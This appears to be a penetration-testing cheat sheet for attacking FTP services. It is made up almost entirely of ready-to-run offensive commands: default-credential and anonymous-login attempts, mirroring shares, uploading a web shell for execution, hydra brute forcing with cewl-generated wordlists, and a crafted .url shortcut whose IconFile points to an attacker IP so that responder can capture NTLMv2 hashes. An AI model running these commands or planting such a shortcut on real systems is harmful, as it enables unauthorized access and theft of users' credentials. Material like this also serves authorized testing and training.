### Try Default Credentials

```bash
admin:admin
```

### Anonymous Login

```bash
ftp $IP
ftp> status
ftp> ls -R
ftp> get $FILE
ftp> put $FILE

wget -m --no-passive ftp://anonymous:anonymous@$IP
```

### Service Interaction

<aside>

```powershell
nc -nv $IP 21
telnet $IP 21
openssl s_client -connect $IP:21 -starttls ftp
```

“229 Entering Extended Passive Mode”

```bash
ftp $IP
passive # switches off the passive mode
ls -la

# Alternatively, you can run
ftp $IP -A
ls -la
```

When downloading or uploading files, remember to run `ascii` if uploading/downloading text files and `binary` if uploading/downloading any other files such as exe, php, zip, pdf, etc or else your files may get corrupted.

```bash
ftp> ascii
200 Switching to ASCII mode.
ftp> binary
200 Switching to Binary mode.
```

</aside>

### Download

Always download ftp shares to your machine

```bash
wget -m ftp://$IP/$SHARE
wget -m --no-passive ftp://anonymous:anonymous@<target ip>
```

### Upload + WebShell & Execution

If there is a webservice, maybe you can access the FTP directory and execute that file.

### Windows + URI Redirection & NTLM Hash Steal

```bash
# Create a file, e.g. wook.url
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\<attacker ip>\%USERNAME%.icon
IconIndex=1

# On kali, run responder and prepare to capture the NTLMv2 hash when someone interacts with your wook.url
sudo responder -I tun0 

# upload wook.url into the FTP folder and wait
```

### Bruteforce

```bash
# -L for a file containing usernames, -l for a single username. -P for a file containing passwords, -p for a single password
hydra -L users.txt -P password.txt ftp://<ip>

# to generate words from webpage

cewl http://<ip>:<port> > word.list
cewl http://<ip>:<port> --lowercase >> word.list
```